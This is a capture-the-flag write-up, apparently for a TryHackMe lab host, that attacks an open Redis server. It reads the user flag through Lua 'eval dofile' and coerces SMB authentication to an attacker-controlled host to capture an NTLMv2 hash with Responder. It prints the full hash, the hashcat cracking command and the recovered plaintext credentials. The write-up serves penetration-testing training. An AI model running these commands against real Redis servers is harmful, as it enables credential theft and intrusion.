We first connect to Redis using `redis-cli`

`redis-cli -h active.thm`

We list `INFO` and get config data with `GET CONFIG *`

We can see redis install package here:
`C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402`

That tells us there is an `enterprise-security` user

We use this article: 
`https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html`

Which tells us redis will evauluate LUA code. We try to get the user flag with this:

`eval "dofile ('c:\\\\users\enterprise-security\\\\desktop\\\\user.txt')" 0`

This gets us the user flag.

We know that we can access filesystem with the `eval dofile` command. We can try to access an arbitrary share and maybe it will pass NTLM hash

---

We set up a responder listener on our attack box
`sudo responder -I tun0 -A`

We try to access a random folder on our attack box from redis-cli
`eval "dofile (//attack_box_ip/asdf)" 0`

We get a hit on responder:

```
[SMB] NTLMv2-SSP Client   : 10.10.195.250
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:d51bc40d1a0d3e6c:2E43A5B799D2ACB1C392B1D827766F9E:0101000000000000C0653150DE09D2011BE9080707BD034A000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000CF9C9E62F9BB56BAE3CD0BAAD50BE0F5636DB9C60D1ED12A4933C6683A17710A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310033002E00320032002E003100320035000000000000000000  
```

We throw this hash into hashcat:
`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`

We get our creds:
`enterprise-security:sand_0873959498`